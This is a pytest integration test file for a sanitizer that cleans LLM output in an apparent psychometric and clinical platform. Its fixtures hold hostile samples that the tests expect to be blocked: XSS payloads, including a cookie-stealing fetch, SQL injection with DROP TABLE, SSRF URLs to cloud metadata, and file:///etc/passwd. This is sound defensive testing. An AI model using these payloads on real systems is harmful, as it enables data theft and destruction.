"""
LLM Sanitization Tests - Integration Tests

This test suite validates the full LLM sanitization pipeline
with real-world scenarios and complete workflows.

Compliance: NIST AI RMF, OWASP, HIPAA §164.312(e)(1), SOC 2 CC7.2
"""

import pytest
from app.services.llm_sanitization import (
    LLMSanitizer,
    ContentType,
    check_for_xss,
    check_for_ssrf,
    validate_sql_query,
    validate_json_schema
)


class TestFullPipelineIntegration:
    """Test complete sanitization pipeline integration"""

    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer instance"""
        return LLMSanitizer()

    # ========================================================================
    # End-to-End Workflow Tests
    # ========================================================================

    def test_complete_sanitization_workflow(self, sanitizer):
        """Test full sanitization workflow from input to output"""
        llm_output = '''
        Based on your request, here's the data:

        <script>alert('XSS')</script>

        You can also check the metadata at: http://169.254.169.254/latest/meta-data/

        SQL query: SELECT * FROM users WHERE id = 1 UNION SELECT * FROM admin

        Visit https://docs.psychsync.com/guide for more info.
        '''

        result = sanitizer.sanitize(llm_output, content_type="text")

        # Verify XSS blocked
        assert "<script>" not in result.sanitized
        assert "alert(" not in result.sanitized

        # Verify SSRF blocked
        assert "169.254.169.254" not in result.sanitized
        assert "docs.psychsync.com" in result.sanitized  # Allow-listed domain should remain

        # Verify SQL injection handled
        assert "UNION SELECT" not in result.sanitized

        # Verify content type detected
        assert result.content_type == ContentType.HTML or result.content_type == ContentType.TEXT

        # Verify modifications tracked
        assert len(result.modifications) > 0

    def test_multi_attack_payload(self, sanitizer):
        """Test payload with multiple attack types"""
        malicious = f"""
        <script>
            fetch('http://127.0.0.1:8000/steal?data=' + document.cookie)
        </script>

        SQL: SELECT * FROM users WHERE id = '{{user.id}}'; DROP TABLE users --

        File: file:///etc/passwd

        More: <img src=x onerror="alert('XSS')">
        """

        result = sanitizer.sanitize(malicious, content_type="text")

        # All attacks should be blocked
        assert "<script>" not in result.sanitized.lower()
        assert "127.0.0.1" not in result.sanitized
        assert "DROP TABLE" not in result.sanitized or "BLOCKED" in result.sanitized
        assert "file://" not in result.sanitized
        assert "onerror=" not in result.sanitized

    # ========================================================================
    # Real-World LLM Scenarios
    # ========================================================================

    def test_llm_code_generation_response(self, sanitizer):
        """Test sanitization of LLM code generation"""
        llm_response = '''
        Here's a Python function to process user data:

        ```python
        def process_user_input(user_input):
            # Sanitize input
            query = f"SELECT * FROM users WHERE name = '{user_input}'"
            result = db.execute(query)
            return result
        ```

        This function queries the database with the user input.
        '''

        result = sanitizer.sanitize(llm_response, content_type="text")

        # Should detect code content
        assert result.content_type == ContentType.CODE

        # Code should require approval
        assert result.approval_required is True

        # SQL in code should be flagged
        assert "SELECT" in result.sanitized  # Code preserved but flagged
        assert result.approval_request_id is not None

    def test_llm_json_response(self, sanitizer):
        """Test sanitization of LLM JSON response"""
        llm_json = '''
        {
            "user_profile": {
                "name": "John Doe",
                "callback_url": "http://192.168.1.50/webhook",
                "description": "<script>alert('XSS')</script>",
                "query": "SELECT * FROM users"
            }
        }
        '''

        result = sanitizer.sanitize(llm_json, content_type="json")

        # Should detect as JSON
        assert result.content_type == ContentType.JSON

        # Should block SSRF URL in JSON
        assert "192.168.1.50" not in result.sanitized

        # Should block XSS in JSON
        assert "<script>" not in result.sanitized

    def test_llm_html_response(self, sanitizer):
        """Test sanitization of LLM HTML response"""
        llm_html = '''
        <html>
        <head><title>User Dashboard</title></head>
        <body>
        <h1>Welcome, <span id="username">{{user.name}}</span></h1>

        <script>
            function initDashboard() {
                fetch('/api/user/' + userId);
            }
        </script>

        <a href="http://127.0.0.1:3000/config">Settings</a>
        <img src="avatar.jpg" onerror="stealData()">
        </body>
        </html>
        '''

        result = sanitizer.sanitize(llm_html, content_type="html")

        # HTML tags should be stripped
        assert "<script>" not in result.sanitized
        assert "function initDashboard" not in result.sanitized or "JavaScript" in result.sanitized

        # Event handlers removed
        assert "onerror=" not in result.sanitized

        # SSRF blocked
        assert "127.0.0.1" not in result.sanitized

    def test_llm_markdown_response(self, sanitizer):
        """Test sanitization of LLM markdown response"""
        llm_markdown = '''
        # User Report

        Here's your personalized dashboard link: http://10.0.0.53:8080/dashboard

        To run the analysis:
        ```bash
        curl http://169.254.169.254/latest/meta-data/ -o metadata.txt
        ```

        ![XSS](x onerror="alert(1)")

        [Internal Link](file:///etc/config)
        '''

        result = sanitizer.sanitize(llm_markdown, content_type="text")

        # Internal URLs blocked
        assert "10.0.0.53" not in result.sanitized
        assert "169.254.169.254" not in result.sanitized
        assert "file://" not in result.sanitized

    # ========================================================================
    # Content Type Classification Tests
    # ========================================================================

    def test_classifies_content_correctly(self, sanitizer):
        """Verify content type classification accuracy"""
        test_cases = [
            ("Plain text without special characters", ContentType.TEXT),
            ("<div>Hello</div>", ContentType.HTML),
            ("SELECT * FROM users", ContentType.SQL),
            ("function test() {}", ContentType.CODE),
            ('{"key": "value"}', ContentType.JSON),
            ("const x = 5;", ContentType.JAVASCRIPT),
        ]

        for content, expected_type in test_cases:
            result = sanitizer.sanitize(content, content_type="text")
            assert result.content_type == expected_type, f"Failed for: {content[:50]}"

    def test_mixed_content_classification(self, sanitizer):
        """Test classification of mixed content"""
        # HTML with JavaScript
        html_with_js = '<script>alert(1)</script>'
        result = sanitizer.sanitize(html_with_js, content_type="text")
        assert result.content_type == ContentType.JAVASCRIPT or result.content_type == ContentType.HTML

        # Code with SQL
        code_with_sql = 'db.execute("SELECT * FROM users")'
        result = sanitizer.sanitize(code_with_sql, content_type="text")
        assert result.content_type == ContentType.CODE or result.content_type == ContentType.SQL

    # ========================================================================
    # Approval Workflow Tests
    # ========================================================================

    def test_approval_request_id_format(self, sanitizer):
        """Verify approval request ID format"""
        sql_query = "SELECT * FROM users"
        result = sanitizer.sanitize(sql_query, content_type="sql")

        assert result.approval_required is True
        assert result.approval_request_id is not None
        assert "approve_" in result.approval_request_id
        assert "sql" in result.approval_request_id.lower()

    def test_approval_for_different_content_types(self, sanitizer):
        """Test approval requirements for different content types"""
        # SQL requires approval
        result = sanitizer.sanitize("SELECT * FROM users", content_type="sql")
        assert result.approval_required is True

        # Code requires approval
        result = sanitizer.sanitize("def malicious(): pass", content_type="code")
        assert result.approval_required is True

        # JavaScript requires approval
        result = sanitizer.sanitize("function steal() {}", content_type="javascript")
        assert result.approval_required is True

        # Text doesn't require approval
        result = sanitizer.sanitize("Just plain text", content_type="text")
        assert result.approval_required is False

        # Safe JSON doesn't require approval
        safe_json = '{"summary": "Test", "recommendations": []}'
        result = sanitizer.sanitize(safe_json, content_type="json")
        assert result.approval_required is False

    # ========================================================================
    # Schema Validation Tests
    # ========================================================================

    def test_json_schema_validation_success(self, sanitizer):
        """Test successful JSON schema validation"""
        valid_json = '''
        {
            "summary": "User assessment results",
            "recommendations": ["Improve communication", "Focus on teamwork"],
            "confidence": 0.85
        }
        '''

        result = sanitizer.sanitize(valid_json, content_type="json")

        assert result.content_type == ContentType.JSON
        # Should not have validation errors
        validation_errors = [w for w in result.warnings if "validation" in w.lower()]
        assert len(validation_errors) == 0

    def test_json_schema_validation_failure(self, sanitizer):
        """Test JSON schema validation failure"""
        invalid_json = '''
        {
            "summary": "Test",
            "unexpected_field": "This should not be here",
            "code": "malicious()"
        }
        '''

        result = sanitizer.sanitize(invalid_json, content_type="json")

        # Should have validation warnings
        assert len(result.warnings) > 0
        assert any("unexpected" in w.lower() or "validation" in w.lower() for w in result.warnings)

    # ========================================================================
    # Performance and Stress Tests
    # ========================================================================

    def test_large_content_sanitization(self, sanitizer):
        """Test sanitization of large content"""
        large_content = """
        <p>Safe content</p>
        """ * 1000 + """
        <script>alert('XSS')</script>
        """ + """
        <p>More safe content</p>
        """ * 1000

        import time
        start = time.time()
        result = sanitizer.sanitize(large_content, content_type="text")
        duration = time.time() - start

        # Should complete in reasonable time (< 5 seconds)
        assert duration < 5.0
        assert "<script>" not in result.sanitized

    def test_multiple_sanitization_calls(self, sanitizer):
        """Test multiple sequential sanitization calls"""
        contents = [
            "<script>alert(1)</script>",
            "SELECT * FROM users; DROP TABLE users",
            "Visit http://127.0.0.1/admin",
            '{"callback": "http://192.168.1.1/webhook"}',
        ]

        results = [sanitizer.sanitize(c, content_type="text") for c in contents]

        # All should be sanitized
        for result in results:
            assert result.sanitized is not None
            assert len(result.modifications) > 0 or len(result.warnings) > 0

    # ========================================================================
    # Helper Function Tests
    # ========================================================================

    def test_check_for_xss_helper(self):
        """Test XSS detection helper function"""
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<iframe src='evil'>",
        ]

        for payload in xss_payloads:
            detected = check_for_xss(payload)
            assert len(detected) > 0, f"Failed to detect XSS in: {payload}"

        safe_payload = "Just safe text with no scripts"
        detected = check_for_xss(safe_payload)
        assert len(detected) == 0

    def test_check_for_ssrf_helper(self):
        """Test SSRF detection helper function"""
        ssrf_payloads = [
            "http://169.254.169.254/latest/",
            "http://127.0.0.1/admin",
            "file:///etc/passwd",
            "http://192.168.1.1/config",
        ]

        for payload in ssrf_payloads:
            detected = check_for_ssrf(payload)
            assert len(detected) > 0, f"Failed to detect SSRF in: {payload}"

        safe_payload = "Visit https://docs.psychsync.com/guide"
        detected = check_for_ssrf(safe_payload)
        assert len(detected) == 0

    def test_validate_sql_query_helper(self):
        """Test SQL validation helper function"""
        # Safe query
        is_safe, reason = validate_sql_query("SELECT id, name FROM users WHERE active = true")
        assert is_safe is True
        assert reason == ""

        # Dangerous queries
        dangerous_queries = [
            ("SELECT * FROM users -- DROP TABLE", "comment"),
            ("SELECT * FROM users; DROP TABLE users", "chaining"),
            ("SELECT * FROM users UNION SELECT * FROM admin", "union"),
        ]

        for query, keyword in dangerous_queries:
            is_safe, reason = validate_sql_query(query)
            assert is_safe is False, f"Query should be unsafe: {query}"
            assert keyword in reason.lower()

    def test_validate_json_schema_helper(self):
        """Test JSON schema validation helper function"""
        schema = {
            "type": "object",
            "properties": {
                "summary": {"type": "string"},
                "recommendations": {"type": "array"}
            },
            "required": ["summary"],
            "additionalProperties": False
        }

        # Valid JSON
        valid_json = '{"summary": "Test", "recommendations": []}'
        is_valid, error = validate_json_schema(valid_json, schema)
        assert is_valid is True
        assert error == ""

        # Invalid JSON (missing required field)
        invalid_json = '{"recommendations": []}'
        is_valid, error = validate_json_schema(invalid_json, schema)
        assert is_valid is False
        assert "summary" in error.lower()

        # Invalid JSON (unexpected field)
        invalid_json2 = '{"summary": "Test", "unexpected": "field"}'
        is_valid, error = validate_json_schema(invalid_json2, schema)
        assert is_valid is False
        assert "unexpected" in error.lower()

    # ========================================================================
    # Strict Mode Tests
    # ========================================================================

    def test_strict_mode_enforcement(self, sanitizer):
        """Test strict mode enforcement"""
        javascript = "function malicious() { exploit(); }"

        # Without strict mode
        result = sanitizer.sanitize(javascript, content_type="text", strict_mode=False)
        # May not generate mismatch warning

        # With strict mode
        result = sanitizer.sanitize(javascript, content_type="text", strict_mode=True)
        # Should detect content type mismatch
        assert result.content_type == ContentType.JAVASCRIPT or result.content_type == ContentType.CODE
        assert len(result.warnings) > 0
        assert any("mismatch" in w.lower() or "content type" in w.lower() for w in result.warnings)

    # ========================================================================
    # Sanitization Result Structure Tests
    # ========================================================================

    def test_sanitization_result_completeness(self, sanitizer):
        """Verify SanitizationResult has all required fields"""
        result = sanitizer.sanitize("Test content", content_type="text")

        # Check all required fields exist
        assert hasattr(result, 'original')
        assert hasattr(result, 'sanitized')
        assert hasattr(result, 'content_type')
        assert hasattr(result, 'modifications')
        assert hasattr(result, 'approval_required')
        assert hasattr(result, 'approval_request_id')
        assert hasattr(result, 'warnings')

        # Check field types
        assert isinstance(result.original, str)
        assert isinstance(result.sanitized, str)
        assert isinstance(result.content_type, ContentType)
        assert isinstance(result.modifications, list)
        assert isinstance(result.approval_required, bool)
        assert isinstance(result.warnings, list)

    def test_result_immutability(self, sanitizer):
        """Verify original content is never modified"""
        original = "<script>alert(1)</script>"
        result = sanitizer.sanitize(original, content_type="text")

        # Original should be unchanged
        assert result.original == original
        assert "<script>" in result.original
        # Sanitized should be clean
        assert "<script>" not in result.sanitized


class TestRealWorldScenarios:
    """Test real-world LLM integration scenarios"""

    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer instance"""
        return LLMSanitizer()

    def test_assessment_recommendation_response(self, sanitizer):
        """Test sanitization of AI assessment recommendation"""
        ai_response = '''
        Based on your MBTI assessment results (INTJ), here are personalized recommendations:

        1. **Communication Style**: Your preference for direct communication can be
           enhanced by considering others' emotional responses.

        2. **Decision Making**: You tend to make decisions based on logical analysis.
           Consider also incorporating emotional intelligence.

        Visit our learning resources at https://docs.psychsync.com/mbti/intj
        for more detailed guidance.

        Your development dashboard is available at your organization portal.
        '''

        result = sanitizer.sanitize(ai_response, content_type="text")

        # Safe content should be preserved
        assert "MBTI assessment" in result.sanitized
        assert "INTJ" in result.sanitized
        assert "docs.psychsync.com" in result.sanitized

        # Should not require approval for safe text
        assert result.approval_required is False

    def test_team_composition_analysis(self, sanitizer):
        """Test sanitization of team composition analysis"""
        ai_analysis = '''
        # Team Composition Analysis

        Your team has the following breakdown:
        - INTJ: 3 members
        - ENFP: 2 members
        - ISTJ: 4 members

        <div class="chart">
        [Visualization would be rendered here]
        </div>

        To export this data, you can use the internal API:
        POST http://10.0.0.53:8080/api/export
        '''

        result = sanitizer.sanitize(ai_analysis, content_type="text")

        # Internal URL should be blocked
        assert "10.0.0.53" not in result.sanitized

        # Safe content preserved
        assert "Team Composition" in result.sanitized
        assert "INTJ" in result.sanitized

    def test_clinical_report_generation(self, sanitizer):
        """Test sanitization of clinical report generation"""
        clinical_report = '''
        # Clinical Assessment Report

        **Patient ID**: PAT-001
        **Date**: 2025-12-26

        ## PHQ-9 Results

        The patient scored 14 on the PHQ-9 assessment, indicating moderate depression.

        Recommendations:
        - Consider referral to mental health professional
        - Monitor for worsening symptoms
        - Follow up in 2 weeks

        This report contains protected health information and must be handled securely.
        '''

        result = sanitizer.sanitize(clinical_report, content_type="text")

        # Clinical content should be preserved
        assert "PHQ-9" in result.sanitized
        assert "moderate depression" in result.sanitized

        # Should not have security warnings for safe clinical text
        security_warnings = [w for w in result.warnings if "dangerous" in w.lower() or "blocked" in w.lower()]
        assert len(security_warnings) == 0

    def test_data_export_request(self, sanitizer):
        """Test sanitization of data export request from LLM"""
        export_request = '''
        To export your assessment data, the system can generate a SQL query:

        ```sql
        SELECT user_id, assessment_type, score, created_at
        FROM responses
        WHERE user_id = 'current_user'
        ORDER BY created_at DESC
        LIMIT 1000
        ```

        This query will be executed and the results exported to CSV format.

        The export will be saved to: /var/assessment-exports/user_data_[timestamp].csv
        '''

        result = sanitizer.sanitize(export_request, content_type="text")

        # Should detect SQL in the content
        assert result.content_type == ContentType.SQL or result.content_type == ContentType.CODE

        # SQL should require approval
        assert result.approval_required is True
        assert result.approval_request_id is not None

        # Safe text should be preserved
        assert "export" in result.sanitized.lower()
        assert "CSV" in result.sanitized
